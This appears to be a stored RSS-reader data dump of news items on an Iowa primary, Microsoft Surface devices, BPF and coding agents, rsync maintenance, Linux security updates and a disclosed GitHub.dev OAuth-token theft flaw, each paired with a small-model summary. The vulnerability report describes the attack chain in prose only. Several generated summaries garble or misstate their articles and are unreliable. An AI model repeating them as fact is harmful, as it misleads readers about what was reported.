+• The article mentions that each tea towel washes dishes, reflects on past conversations, and suggests a new tea towel to pass back and forth while discussing the day.`,summary_model:`qwen2.5:0.5b`,image_url:`https://npr.brightspotcdn.com/dims3/default/strip/false/crop/1920x1080+0+0/resize/1920x1080!/?url=http%3A%2F%2Fnpr-brightspot.s3.amazonaws.com%2F2a%2F5e%2Fe6a747a9476281d79bb559d30ff8%2Ffarflungpostcard-en.jpg`,published_at:1780494426,fetched_at:1780509343,content_hash:`0fb83fc2dd065d3db98677f1619d411c9e092d8895f830e803e82538e7bd7454`,is_read:!1,is_starred:!1,is_later:!1,dup_count:0},{id:80,feed_id:9,guid:`https://www.bbc.com/news/articles/c4g8nd48jxro#1`,url:`https://www.bbc.com/news/articles/c4g8nd48jxro?at_medium=RSS&at_campaign=rss`,title:`Trump-backed candidate in Iowa loses primary`,content_html:`<div id="readability-page-1" class="page"><div id="bbc-main"><article><div data-testid="byline" data-component="byline-block"><p><time datetime="2026-06-03T13:35:04.936Z">4 hours ago</time></p><p><span data-testid="byline-contributors"><div data-testid="byline-contributors-contributor-0"><p><span>Anthony Zurcher</span><span data-testid="byline-contributors-contributor-0-role-location">North America correspondent</span></p></div></span></p></div><div data-component="image-block"><figure><div><p><img src="https://static.files.bbci.co.uk/bbcdotcom/web/20260527-122213-f92e6ec078-web-3.7.0-4/grey-placeholder.png" aria-label="image unavailable"/><img sizes="(min-width: 1280px) 50vw, (min-width: 1008px) 66vw, 96vw" srcset="https://ichef.bbci.co.uk/news/240/cpsprodpb/d43e/live/e3fa2310-5f41-11f1-ae51-c396b5163a64.jpg.webp 240w,https://ichef.bbci.co.uk/news/320/cpsprodpb/d43e/live/e3fa2310-5f41-11f1-ae51-c396b5163a64.jpg.webp 320w,https://ichef.bbci.co.uk/news/480/cpsprodpb/d43e/live/e3fa2310-5f41-11f1-ae51-c396b5163a64.jpg.webp 480w,https://ichef.bbci.co.uk/news/640/cpsprodpb/d43e/live/e3fa2310-5f41-11f1-ae51-c396b5163a64.jpg.webp 640w,https://ichef.bbci.co.uk/news/800/cpsprodpb/d43e/live/e3fa2310-5f41-11f1-ae51-c396b5163a64.jpg.webp 800w,https://ichef.bbci.co.uk/news/1024/cpsprodpb/d43e/live/e3fa2310-5f41-11f1-ae51-c396b5163a64.jpg.webp 1024w,https://ichef.bbci.co.uk/news/1536/cpsprodpb/d43e/live/e3fa2310-5f41-11f1-ae51-c396b5163a64.jpg.webp 1536w" src="https://ichef.bbci.co.uk/news/480/cpsprodpb/d43e/live/e3fa2310-5f41-11f1-ae51-c396b5163a64.jpg.webp" loading="eager" alt="Getty Images File image of Randy Feenstra. He wears a suit as he attends a hearing in the US House"/><span>Getty Images</span></p></div><p><figcaption>Randy Feenstra was seen by many as a frontrunner, and was a reliable Trump supporter</figcaption></p></figure></div><div data-component="text-block"><p>A candidate hoping to run for governor in the US state of Iowa has lost a closely watched primary contest, despite getting the backing of Donald Trump. </p></div><div data-component="text-block"><p>Randy Feenstra, who was seen by many as a frontrunner, conceded the race on Tuesday, having received a last-minute presidential endorsement ahead of the vote.</p></div><div data-component="text-block"><p>The three-term Iowa congressman, who was running for his party&#39;s nomination for November&#39;s governor contest, had also been a reliable Trump supporter. </p></div><div data-component="text-block"><p>But for his part, the winner, farmer and businessman Zach Lahn, campaigned on a decidedly Trumpian platform – with slogans like &#34;Make Iowa Healthy Again&#34; and &#34;Iowa first&#34;. </p></div><div data-component="text-block"><p>He campaigned on limiting foreign and out-of-state  ownership of Iowa land and railed against &#34;global elites&#34;.</p></div><div data-component="text-block"><p>Lahn also had the backing of Turning Point USA, the conservative group founded by the late Charlie Kirk, and grassroots conservatives in the state who viewed Feenstra as too much a part of the Washington establishment.</p></div><div data-component="text-block"><p>Trump has been out of the public eye the past six days, other than prerecorded interviews with friendly media and his postings on Truth Social, which included an assertion that negotiations with Iran over the war &#34;have been going on continuously&#34;.</p></div><div data-component="text-block"><p>While the talks may be ongoing, they don&#39;t seem to be making much progress. It&#39;s been a rough week for Trump domestically as well - his administration has abandoned plans to create a $1.8bn (£1.3bn) &#34;anti-weaponisation&#34; fund. The fund had been designed to compensate individuals who claimed to be targets of political investigation by previous presidential administrations.</p></div><div data-component="text-block"><p>And Tuesday night marked a hit to his golden track record of political endorsements.</p></div><div data-component="text-block"><p>Over the past few weeks, it has appeared like a Trump endorsement was a guaranteed ticket to success. </p></div><div data-component="text-block"><p>Congressman Thomas Massie in Kentucky and Senator Bill Cassidy were both unseated by Trump-backed challengers. And Texas Attorney General Ken Paxton won his state&#39;s Republican Senate nomination contest over incumbent John Cornyn - although it appeared increasingly likely that Paxton was going to defeat his opponent with or without Trump&#39;s help. </p></div><div data-component="text-block"><p>As for the Feenstra result - that may prove to be a case of the president&#39;s political instincts being off in a state that, while voting for him in three straight elections, appears to be souring a bit.</p></div><div data-component="text-block"><p>Trump&#39;s wide-ranging programme of trade tariffs – and the Chinese response to them – have hit Iowa&#39;s farmers hard. And then came the US-Israeli war with Iran, packing a double punch with its higher fuel and fertiliser costs.</p></div><div data-component="text-block"><p>According to a recent YouGov/Economist poll, Trump has a net approval rating of -20% in Iowa. </p></div><div data-component="text-block"><p>This unease has given Democrats hope of flipping the governorship, where Lahn will now face off in November against Democratic State Auditor Rob Sand. </p></div><div data-component="text-block"><p>Democrats are also targeting the Senate seat being vacated by Republican Joni Ernst. Projected results show that Paralympian Josh Turek - a centrist who had the backing of national Democrats - won his party&#39;s  primary and will go on to face Republican candidate Ashley Hinson.</p></div><div data-component="text-block"><p>Several election analysis groups have moved both races to a toss-up or leans Republican.</p></div><div data-component="text-block"><p>So, while Texas gets a lot of national attention, the key to Democratic success in November may lie amidst the cornfields of Iowa - which was once generally blue but has voted red in recent years.</p></div><div data-component="text-block"><p>That all makes it worth keeping a close eye on the Hawkeye State.</p></div><div data-component="image-block"><figure><div><p><img src="https://static.files.bbci.co.uk/bbcdotcom/web/20260527-122213-f92e6ec078-web-3.7.0-4/grey-placeholder.png" aria-label="image unavailable"/><img sizes="(min-width: 1280px) 50vw, (min-width: 1008px) 66vw, 96vw" srcset="https://ichef.bbci.co.uk/news/240/cpsprodpb/9e11/live/4271f2f0-5f5c-11f1-8b8c-6d33e1d5abb6.png.webp 240w,https://ichef.bbci.co.uk/news/320/cpsprodpb/9e11/live/4271f2f0-5f5c-11f1-8b8c-6d33e1d5abb6.png.webp 320w,https://ichef.bbci.co.uk/news/480/cpsprodpb/9e11/live/4271f2f0-5f5c-11f1-8b8c-6d33e1d5abb6.png.webp 480w,https://ichef.bbci.co.uk/news/640/cpsprodpb/9e11/live/4271f2f0-5f5c-11f1-8b8c-6d33e1d5abb6.png.webp 640w,https://ichef.bbci.co.uk/news/800/cpsprodpb/9e11/live/4271f2f0-5f5c-11f1-8b8c-6d33e1d5abb6.png.webp 800w,https://ichef.bbci.co.uk/news/1024/cpsprodpb/9e11/live/4271f2f0-5f5c-11f1-8b8c-6d33e1d5abb6.png.webp 1024w,https://ichef.bbci.co.uk/news/1536/cpsprodpb/9e11/live/4271f2f0-5f5c-11f1-8b8c-6d33e1d5abb6.png.webp 1536w" src="https://ichef.bbci.co.uk/news/480/cpsprodpb/9e11/live/4271f2f0-5f5c-11f1-8b8c-6d33e1d5abb6.png.webp" loading="lazy" alt="A thin, grey banner promoting the US Politics Unspun newsletter. On the right, there is an image of North America correspondent Anthony Zurcher, wearing a blue suit and shirt and grey tie. Behind him is a visualisation of the Capitol Building on vertical red, grey and blue stripes. The banner reads: &#34;The newsletter that cuts through the noise.”"/></p></div></figure></div><div data-component="text-block"><p>Follow the twists and turns of Trump&#39;s second term with North America correspondent Anthony Zurcher&#39;s weekly <a href="https://www.bbc.co.uk/news/world-us-canada-68093155" target="_self">US Politics Unspun</a> newsletter. Readers in the UK can <a href="https://www.bbc.co.uk/newsletters/zgmn46f" target="_self">sign up here</a>. Those outside the UK can <a href="https://www.bbc.co.uk/news/articles/c2lkky9zngvo" target="_self">sign up here</a>.</p></div></article></div></div>`,content_text:`4 hours agoAnthony ZurcherNorth America correspondentGetty ImagesRandy Feenstra was seen by many as a frontrunner, and was a reliable Trump supporterA candidate hoping to run for governor in the US state of Iowa has lost a closely watched primary contest, despite getting the backing of Donald Trump. Randy Feenstra, who was seen by many as a frontrunner, conceded the race on Tuesday, having received a last-minute presidential endorsement ahead of the vote.The three-term Iowa congressman, who was running for his party's nomination for November's governor contest, had also been a reliable Trump supporter. But for his part, the winner, farmer and businessman Zach Lahn, campaigned on a decidedly Trumpian platform – with slogans like "Make Iowa Healthy Again" and "Iowa first". He campaigned on limiting foreign and out-of-state  ownership of Iowa land and railed against "global elites".Lahn also had the backing of Turning Point USA, the conservative group founded by the late Charlie Kirk, and grassroots conservatives in the state who viewed Feenstra as too much a part of the Washington establishment.Trump has been out of the public eye the past six days, other than prerecorded interviews with friendly media and his postings on Truth Social, which included an assertion that negotiations with Iran over the war "have been going on continuously".While the talks may be ongoing, they don't seem to be making much progress. It's been a rough week for Trump domestically as well - his administration has abandoned plans to create a $1.8bn (£1.3bn) "anti-weaponisation" fund. The fund had been designed to compensate individuals who claimed to be targets of political investigation by previous presidential administrations.And Tuesday night marked a hit to his golden track record of political endorsements.Over the past few weeks, it has appeared like a Trump endorsement was a guaranteed ticket to success. Congressman Thomas Massie in Kentucky and Senator Bill Cassidy were both unseated by Trump-backed challengers. And Texas Attorney General Ken Paxton won his state's Republican Senate nomination contest over incumbent John Cornyn - although it appeared increasingly likely that Paxton was going to defeat his opponent with or without Trump's help. As for the Feenstra result - that may prove to be a case of the president's political instincts being off in a state that, while voting for him in three straight elections, appears to be souring a bit.Trump's wide-ranging programme of trade tariffs – and the Chinese response to them – have hit Iowa's farmers hard. And then came the US-Israeli war with Iran, packing a double punch with its higher fuel and fertiliser costs.According to a recent YouGov/Economist poll, Trump has a net approval rating of -20% in Iowa. This unease has given Democrats hope of flipping the governorship, where Lahn will now face off in November against Democratic State Auditor Rob Sand. Democrats are also targeting the Senate seat being vacated by Republican Joni Ernst. Projected results show that Paralympian Josh Turek - a centrist who had the backing of national Democrats - won his party's  primary and will go on to face Republican candidate Ashley Hinson.Several election analysis groups have moved both races to a toss-up or leans Republican.So, while Texas gets a lot of national attention, the key to Democratic success in November may lie amidst the cornfields of Iowa - which was once generally blue but has voted red in recent years.That all makes it worth keeping a close eye on the Hawkeye State.Follow the twists and turns of Trump's second term with North America correspondent Anthony Zurcher's weekly US Politics Unspun newsletter. Readers in the UK can sign up here. Those outside the UK can sign up here.`,summary:`• Here is the summary for your article:
+• A third-term Iowa congressman named Randy Feenstra was defeated by a farmer and businessman named Zach Lahn, who campaigned on Trump's platform of limiting foreign ownership of land and opposing global elites. While Feenstra had received Trump's backing through his endorsement, Lahn gained significant traction due to his conservative platform and the support of Turning Point USA, an organization founded by Charlie Kirk.`,summary_model:`qwen2.5:0.5b`,image_url:`https://ichef.bbci.co.uk/news/1024/branded_news/d43e/live/e3fa2310-5f41-11f1-ae51-c396b5163a64.jpg`,published_at:1780493704,fetched_at:1780509344,content_hash:`2ade1b7246429431a2d8762e9b80139cdd07c3c20ed600a7ffad099dcca96a9a`,is_read:!1,is_starred:!1,is_later:!1,dup_count:0},{id:7,feed_id:3,guid:`https://www.theverge.com/?p=941600`,url:`https://www.theverge.com/tech/941600/microsoft-surface-laptop-ultra-dev-box-hands-on`,title:`A first look at Microsoft’s Surface Laptop Ultra and Surface Dev Box`,author:`Tom Warren`,content_html:`
+
+						
+<figure>
+
+<img alt="" data-caption="The Surface Laptop Ultra." data-portal-copyright="" data-has-syndication-rights="1" src="https://platform.theverge.com/wp-content/uploads/sites/2/2026/06/surfacelaptopultra1.jpg?quality=90&#038;strip=all&#038;crop=0,0,100,100" />
+	<figcaption>
+	The Surface Laptop Ultra.	</figcaption>
+</figure>
+<p class="has-text-align-none">Microsoft has two new Surface devices arriving later this year, both powered by Nvidia's RTX Spark chips. I got a chance to take a closer look at both the <a href="https://www.theverge.com/tech/940584/microsoft-surface-laptop-ultra-nvidia-rtx-spark-pictures">Surface Laptop Ultra</a> and <a href="https://www.theverge.com/news/941271/microsoft-surface-rtx-spark-dev-box-specs-availability">Surface RTX Spark Dev Box</a> at Microsoft's Build conference this week, and while both have the same chip inside, they're utilizing Nvidia's RTX Spark in different ways.</p>
+<p class="has-text-align-none">The Surface Laptop Ultra looks and feels very much like a 16-inch MacBook Pro. There are no transforming hinges, detachable displays, or any other tricks - this is a clamshell laptop built with performance in mind. Microsoft has opted for a 15-inch mini LED panel, which operates at up to 2,000 nits o …</p>
+<p><a href="https://www.theverge.com/tech/941600/microsoft-surface-laptop-ultra-dev-box-hands-on">Read the full story at The Verge.</a></p>
+						`,content_text:`The Surface Laptop Ultra. Microsoft has two new Surface devices arriving later this year, both powered by Nvidia's RTX Spark chips. I got a chance to take a closer look at both the Surface Laptop Ultra and Surface RTX Spark Dev Box at Microsoft's Build conference this week, and while both have the same chip inside, they're utilizing Nvidia's RTX Spark in different ways. The Surface Laptop Ultra looks and feels very much like a 16-inch MacBook Pro. There are no transforming hinges, detachable displays, or any other tricks - this is a clamshell laptop built with performance in mind. Microsoft has opted for a 15-inch mini LED panel, which operates at up to 2,000 nits o … Read the full story at The Verge.`,cleaned_html:`<p>The Surface Laptop Ultra looks like a sleek 16-inch MacBook Pro with no hinges or detachable displays. It uses NVIDIA's RTX Spark chip, designed specifically for laptop screens. Both devices are equipped with a clamshell design and measure 15 inches (mini LED). The Surface Laptop Ultra features a slightly different physical appearance in its dimensions and brightness levels compared to the RTX Spark Dev Box.</p><p>TITLE: Microsoft's Surface Laptop Ultra and RTX Spark Dev Box both feature NVIDIA's RTX Spark chips optimized for laptops with a 16-inch screen. Both devices come equipped with a clamshell design, while the Surface Laptop Ultra is slightly different in its physical appearance.</p>`,summary:`Microsoft's Surface Laptop Ultra and RTX Spark Dev Box both feature NVIDIA's RTX Spark chips designed specifically for laptops with a 16-inch screen. Both devices come equipped with a clamshell design, while the Surface Laptop Ultra is slightly different in its physical appearance.
+
+• The Surface Laptop Ultra features a clamshell design with no hinges or detachable displays.
+• It uses NVIDIA's RTX Spark chip optimized for laptop screens.
+• The device measures 15 inches (mini LED) and operates at up to 2,000 nits brightness.`,summary_model:`qwen2.5:0.5b`,image_url:`https://platform.theverge.com/wp-content/uploads/sites/2/2026/06/surfacelaptopultra1.jpg?quality=90&strip=all&crop=0,0,100,100`,published_at:1780492937,fetched_at:1780509343,content_hash:`7d2191bda3581d21bfc67968e9023f8191b9b1d0f7444277c8ff205ed876e532`,tags:`Gadgets, Hands-on, Laptops`,is_read:!1,is_starred:!1,is_later:!1,dup_count:0},{id:45,feed_id:4,guid:`https://lwn.net/Articles/1075067/`,url:`https://lwn.net/Articles/1075067/`,title:`[$] BPF in the agentic era`,author:`daroc`,content_html:`<p>
+Alexei Starovoitov gave "<q>less of a presentation, more of a scream of
+realization</q>" at the BPF track of the 2026
+<a href="https://events.linuxfoundation.org/lsfmmbpf/">
+Linux Storage, Filesystem,
+Memory-Management, and BPF Summit</a>. He shared a set of ideas for how BPF could
+change to avoid being swept away by the sea-change in programming represented by modern
+large language models (LLMs) and the coding agents based on them.
+In a follow-up session, the discussion covered
+more problems with how coding agents use tools like bpftrace, and the current deluge of
+patches in need of review in the BPF subsystem.
+</p>`,content_text:`Alexei Starovoitov gave " less of a presentation, more of a scream of realization " at the BPF track of the 2026 Linux Storage, Filesystem, Memory-Management, and BPF Summit . He shared a set of ideas for how BPF could change to avoid being swept away by the sea-change in programming represented by modern large language models (LLMs) and the coding agents based on them. In a follow-up session, the discussion covered more problems with how coding agents use tools like bpftrace, and the current deluge of patches in need of review in the BPF subsystem.`,summary:`Alexei Starovoitov presented his ideas for how BPF can improve the ability of programming to handle larger data sizes and faster code optimization.
+
+• Less of a presentation, more of a scream of realization" (Starovoitov's quote)
+• Discussion of problems with coding agents using bpftrace tools
+• Current need for review in the BPF subsystem`,summary_model:`qwen2.5:0.5b`,published_at:1780492479,fetched_at:1780509343,content_hash:`a63ae58fcd137b6ca4f6637389c5f69f4503c87f078b87d3b3e2fd5c445f8157`,is_read:!1,is_starred:!1,is_later:!1,dup_count:0},{id:46,feed_id:4,guid:`https://lwn.net/Articles/1076040/`,url:`https://lwn.net/Articles/1076040/`,title:`Tridgell: rsync and outrage`,author:`jzb`,content_html:`<p>Andrew Tridgell has written a <a
+href="https://medium.com/@tridge60/rsync-and-outrage-d9849599e5a0">blog
+post</a> responding to complaints that he has begun using LLM tools in
+his work maintaining <a href="https://rsync.samba.org/">rsync</a>:</p>
+
+<blockquote class="bq">
+<p>Like many developers of open source packages I've been hit by a
+flood of security reports lately in my role as the rsync
+maintainer. Many of those reports are AI generated (not all though,
+there are some notable ones with very careful and high quality manual
+analysis).</p>
+
+<p>As this flood started to get more intense I realised I needed to
+raise the defences on rsync a lot — we needed much more thorough test
+suites, code coverage analysis, CI testing on a lot more platforms,
+deliberate and thorough scanning for possible security issues (so I
+find at least some of them before other people!) and the addition of a
+whole lot of defence-in-depth hardening techniques.</p>
+
+<p>[...] Now to the future, because we're not done yet by a long
+shot. The security reports keep rolling in. I'm working on a bunch of
+CVEs right now. Luckily I've been joined by some other very good
+developers with great systems development skills and security
+knowledge. Some of these people came to my attention partly because of
+all the rage happening at the moment, so I get some rage storm clouds
+have silver linings. Watch out for some credits for some great new
+rsync developers in the next release.</p>
+</blockquote>
+
+<p></p>`,content_text:`Andrew Tridgell has written a blog post responding to complaints that he has begun using LLM tools in his work maintaining rsync : Like many developers of open source packages I've been hit by a flood of security reports lately in my role as the rsync maintainer. Many of those reports are AI generated (not all though, there are some notable ones with very careful and high quality manual analysis). As this flood started to get more intense I realised I needed to raise the defences on rsync a lot — we needed much more thorough test suites, code coverage analysis, CI testing on a lot more platforms, deliberate and thorough scanning for possible security issues (so I find at least some of them before other people!) and the addition of a whole lot of defence-in-depth hardening techniques. [...] Now to the future, because we're not done yet by a long shot. The security reports keep rolling in. I'm working on a bunch of CVEs right now. Luckily I've been joined by some other very good developers with great systems development skills and security knowledge. Some of these people came to my attention partly because of all the rage happening at the moment, so I get some rage storm clouds have silver linings. Watch out for some credits for some great new rsync developers in the next release.`,summary:`Andrew Tridgell responds to security reports about using LLM tools in maintaining rsync and discusses the challenges of defending against AI-generated security issues.
+
+• Andrew Tridgell addresses concerns about using AI-generated security reports in his blog post
+• He mentions raising defenses on rsync, including code coverage analysis, CI testing on a lot more platforms, scanning for potential security issues, and adding hardening techniques
+• He also discusses future plans for improving the security of rsync and is joined by other developers with strong systems development skills and security knowledge.`,summary_model:`qwen2.5:0.5b`,published_at:1780491646,fetched_at:1780509343,content_hash:`903c0ffefa0d5d3daae4f3685c35e42674e3a1a23acc880637754d6144abeb98`,is_read:!1,is_starred:!0,is_later:!1,dup_count:0},{id:47,feed_id:4,guid:`https://lwn.net/Articles/1076117/`,url:`https://lwn.net/Articles/1076117/`,title:`Security updates for Wednesday`,author:`jzb`,content_html:`Security updates have been issued by <b>Debian</b> (php-twig), <b>Fedora</b> (hplip, python-wsgidav, roundcubemail, and xorg-x11-server), <b>Oracle</b> (compat-openssl10, httpd:2.4, and kernel), <b>Red Hat</b> (osbuild-composer), <b>SUSE</b> (busybox, cloudflared, cockpit, cups, ffmpeg-4, gnutls, google-osconfig-agent, helm, hplip, kernel, kubelogin, libjxl, libsoup, libunbound8, LibVNCServer-devel, mapserver, nvidia-open-driver-G06-signed, nvidia-open-driver-G07-signed, openssh, python-idna, qemu, rqlite, shadowsocks-v2ray-plugin, ucode-intel, unbound, vim, vorbis-tools, and xorg-x11-server), and <b>Ubuntu</b> (age, dovecot, editorconfig-core, gobgp, libapache-mod-jk, libcommons-lang-java, libcommons-lang3-java, libeconf, linux, linux-aws, linux-aws-6.8, linux-aws-fips, linux-azure, linux-fips,
+ linux-gcp, linux-gcp-6.8, linux-gcp-fips, linux-gke, linux-gkeop,
+ linux-hwe-6.8, linux-ibm, linux-ibm-6.8, linux-nvidia, linux-nvidia-6.8,
+ linux-nvidia-lowlatency, linux-nvidia-tegra, linux-oracle,
+ linux-oracle-6.8, linux-raspi, linux-raspi-realtime, linux-realtime,
+ linux-realtime-6.8, linux, linux-aws, linux-azure, linux-azure-6.17, linux-hwe-6.17,
+ linux-nvidia-6.17, linux-oem-6.17, linux-oracle, linux-oracle-6.17,
+ linux-raspi, linux-realtime, linux-realtime-6.17, linux, linux-aws, linux-gcp, linux-ibm, linux-nvidia, linux-oracle,
+ linux-raspi, linux-realtime, linux-aws-6.17, linux-gcp, linux-gcp-6.17, luanti, mysql-8.0, mysql-8.4, node-tar-fs, and unbound).`,content_text:`Security updates have been issued by Debian (php-twig), Fedora (hplip, python-wsgidav, roundcubemail, and xorg-x11-server), Oracle (compat-openssl10, httpd:2.4, and kernel), Red Hat (osbuild-composer), SUSE (busybox, cloudflared, cockpit, cups, ffmpeg-4, gnutls, google-osconfig-agent, helm, hplip, kernel, kubelogin, libjxl, libsoup, libunbound8, LibVNCServer-devel, mapserver, nvidia-open-driver-G06-signed, nvidia-open-driver-G07-signed, openssh, python-idna, qemu, rqlite, shadowsocks-v2ray-plugin, ucode-intel, unbound, vim, vorbis-tools, and xorg-x11-server), and Ubuntu (age, dovecot, editorconfig-core, gobgp, libapache-mod-jk, libcommons-lang-java, libcommons-lang3-java, libeconf, linux, linux-aws, linux-aws-6.8, linux-aws-fips, linux-azure, linux-fips, linux-gcp, linux-gcp-6.8, linux-gcp-fips, linux-gke, linux-gkeop, linux-hwe-6.8, linux-ibm, linux-ibm-6.8, linux-nvidia, linux-nvidia-6.8, linux-nvidia-lowlatency, linux-nvidia-tegra, linux-oracle, linux-oracle-6.8, linux-raspi, linux-raspi-realtime, linux-realtime, linux-realtime-6.8, linux, linux-aws, linux-azure, linux-azure-6.17, linux-hwe-6.17, linux-nvidia-6.17, linux-oem-6.17, linux-oracle, linux-oracle-6.17, linux-raspi, linux-realtime, linux-realtime-6.17, linux, linux-aws, linux-gcp, linux-ibm, linux-nvidia, linux-oracle, linux-raspi, linux-realtime, linux-aws-6.17, linux-gcp, linux-gcp-6.17, luanti, mysql-8.0, mysql-8.4, node-tar-fs, and unbound).`,summary:`• Debian (php-twig)
+• Fedora (hplip, python-wsgidav, roundcubemail, and xorg-x11-server)
+• Oracle (compat-openssl10, httpd:2.4, and kernel)
+• Red Hat (osbuild-composer)
+• SUSE (busybox, cloudflared, cockpit, cups, ffmpeg-4, gnutls, google-osconfig-agent, helm, hplip, kernel, kubelogin, libjxl, libsoup, libunbound8, LibVNCServer-devel, mapserver, nvidia-open-driver-G06-signed, nvidia-open-driver-G07-signed, openssh, python-idna, qemu, rqlite, shadowsocks-v2ray-plugin, ucode-intel, unbound, vim, vorbis-tools, and xorg-x11-server)`,summary_model:`qwen2.5:0.5b`,published_at:1780491557,fetched_at:1780509343,content_hash:`242223471379c4de8732a2082c5d4e3c97b6013129e12b1fcb8dd984499cb835`,is_read:!1,is_starred:!1,is_later:!1,dup_count:0},{id:50,feed_id:16,guid:`https://thehackernews.com/2026/06/one-click-github-dev-attack-lets.html`,url:`https://thehackernews.com/2026/06/one-click-github-dev-attack-lets.html`,title:`One-Click GitHub Dev Attack Lets Attackers Steal Full GitHub OAuth Tokens`,author:`The Hacker News`,content_html:`<div id="readability-page-1" class="page"><div>
+<p><span>Vulnerability / Software Development</span></p></div><div id="articlebody"><p><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgeHvqmNHvAhdxgoBLbfFWsFBMdvH5SbJovunxx8AYHRkq7HOQ2l6I_ZaJGi_PF5WHKOlHEQHK4HyPBhmzOpYNhPS4HJSna2uLVlEwUV9i2j5YuRqGOLUqgKIrhx2ndFm1OSME7usiLk_ohtIBYyR5Xpq5Pzc2eHAjCK0OA_89JwPNxVrrBVDbTDRVbRG6e/s1600/github.jpg"><img alt="" data-original-height="470" data-original-width="900" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgeHvqmNHvAhdxgoBLbfFWsFBMdvH5SbJovunxx8AYHRkq7HOQ2l6I_ZaJGi_PF5WHKOlHEQHK4HyPBhmzOpYNhPS4HJSna2uLVlEwUV9i2j5YuRqGOLUqgKIrhx2ndFm1OSME7usiLk_ohtIBYyR5Xpq5Pzc2eHAjCK0OA_89JwPNxVrrBVDbTDRVbRG6e/s1600/github.jpg"/></a></p>
+<p>Cybersecurity researchers have disclosed a one-click attack via Microsoft Visual Studio Code (VS Code) that makes it possible to steal a user&#39;s GitHub token.</p>
+
+<p>&#34;Just by clicking a link, it&#39;s possible for an attacker to steal a GitHub token that can read and write to your repos, including private ones,&#34; security researcher Ammar Askar <a href="https://blog.ammaraskar.com/github-token-stealing/">said</a>.</p>
+
+<p>GitHub supports a feature called <a href="https://github.com/github/dev">GitHub.dev</a> that runs as a <a href="https://docs.github.com/en/codespaces/the-githubdev-web-based-editor">lightweight web-based source code editor</a> in the web browser&#39;s sandbox by launching a VS Code environment. It allows users to send pull requests and make commits.</p>
+
+<p>&#34;This functionality is achieved by github.com POSTing over an OAuth token to github.dev that allows it to interact with GitHub on your behalf,&#34; Askar said. &#34;The token is not scoped to the particular repo you interacted with, meaning it has full access to every other repo that you have access to.&#34;</p>
+
+<p>In a nutshell, the vulnerability allows attackers to install malicious VS Code extensions that steal GitHub OAuth tokens when they are passed to GitHub.dev by exploiting a <a href="https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage">message-passing mechanism</a> between the main VS Code window and <a href="https://code.visualstudio.com/api/extension-guides/webview">webviews</a>. Webviews are used to render Markdown previews or edit Jupyter notebooks.</p>
+<p><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgvwh3V2izKKwTcZio2TXCLwYguXnmEBARQ2F9lsZOTAXj6qdB71X__WJOL8BsZvx05qEMO6J7Fuvfn35rGIy6akT9V32tgLRBdT9kBCoNljwIRVk0TjNFvn5EqjQFiWSGwJs-Jubttfxnwfd2k5MqmGpzNFq0ahugsB7WjMv4gFpqdRvSXHKEFyPJFtwU1/s1600/git.png"><img alt="" data-original-height="726" data-original-width="1236" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgvwh3V2izKKwTcZio2TXCLwYguXnmEBARQ2F9lsZOTAXj6qdB71X__WJOL8BsZvx05qEMO6J7Fuvfn35rGIy6akT9V32tgLRBdT9kBCoNljwIRVk0TjNFvn5EqjQFiWSGwJs-Jubttfxnwfd2k5MqmGpzNFq0ahugsB7WjMv4gFpqdRvSXHKEFyPJFtwU1/s1600/git.png"/></a></p>
+<p>Specifically, the exploit runs malicious JavaScript inside an untrusted webview to simulate keypresses (aka keydown events) in the main editor window, open the Command Palette by triggering &#34;Ctrl+Shift+P,&#34; and install an attacker-controlled extension that extracts the GitHub OAuth token sent to GitHub.dev and queries the GitHub API to enumerate all private repositories the victim can access.</p>
+
+<p>It&#39;s worth noting the approach also leverages a VS Code feature called <a href="https://code.visualstudio.com/updates/v1_89#_local-workspace-extensions">local workspace extensions</a> that allows an extension to be directly installed without presenting any additional <a href="https://code.visualstudio.com/docs/configure/extensions/extension-runtime-security#_extension-publisher-trust">trust dialog prompt</a> as long as it&#39;s placed in the &#34;.vscode/extensions&#34; folder within that workspace, effectively bypassing the publisher trust check.</p>
+
+<p>&#34;This is just a small hiccup though, one of the things that extensions can do as part of their package.json is to contribute extra keybindings to VS Code,&#34; the researcher explained. &#34;Since we can reliably trigger keybindings, we can just add a keybind for whatever VS Code command we want, such as installing an extension while skipping the trusted publisher check.&#34;</p>
+
+<p>The researcher also noted GitHub was <a href="https://github.com/microsoft/vscode/issues/319593">notified</a> of the vulnerability on June 2, 2026, an hour after which details of the issue were made public knowledge, citing Microsoft&#39;s <a href="https://blog.ammaraskar.com/vscode-rce/">handling</a> of <a href="https://starlabs.sg/blog/2025/05-breaking-out-of-restricted-mode-xss-to-rce-in-visual-studio-code/">VS Code-related bugs</a> in the past. As of writing, Microsoft has acknowledged the vulnerability and noted that it&#39;s working on a fix.</p>
+
+<p>&#34;To clarify, this issue does not affect VS Code Desktop,&#34; Alexandru Dima, a partner software engineering manager at Microsoft, said.</p>
+
+<p>Found this article interesting?  Follow us on <a href="https://news.google.com/publications/CAAqLQgKIidDQklTRndnTWFoTUtFWFJvWldoaFkydGxjbTVsZDNNdVkyOXRLQUFQAQ" rel="noopener" target="_blank">Google News</a>, <a href="https://twitter.com/thehackersnews" rel="noopener" target="_blank">Twitter</a> and <a href="https://www.linkedin.com/company/thehackernews/" rel="noopener" target="_blank">LinkedIn</a> to read more exclusive content we post.</p>
+</div></div>`,content_text:`Vulnerability / Software Development
+Cybersecurity researchers have disclosed a one-click attack via Microsoft Visual Studio Code (VS Code) that makes it possible to steal a user's GitHub token.
+
+"Just by clicking a link, it's possible for an attacker to steal a GitHub token that can read and write to your repos, including private ones," security researcher Ammar Askar said.
+
+GitHub supports a feature called GitHub.dev that runs as a lightweight web-based source code editor in the web browser's sandbox by launching a VS Code environment. It allows users to send pull requests and make commits.
+
+"This functionality is achieved by github.com POSTing over an OAuth token to github.dev that allows it to interact with GitHub on your behalf," Askar said. "The token is not scoped to the particular repo you interacted with, meaning it has full access to every other repo that you have access to."
+
+In a nutshell, the vulnerability allows attackers to install malicious VS Code extensions that steal GitHub OAuth tokens when they are passed to GitHub.dev by exploiting a message-passing mechanism between the main VS Code window and webviews. Webviews are used to render Markdown previews or edit Jupyter notebooks.
+
+Specifically, the exploit runs malicious JavaScript inside an untrusted webview to simulate keypresses (aka keydown events) in the main editor window, open the Command Palette by triggering "Ctrl+Shift+P," and install an attacker-controlled extension that extracts the GitHub OAuth token sent to GitHub.dev and queries the GitHub API to enumerate all private repositories the victim can access.
+
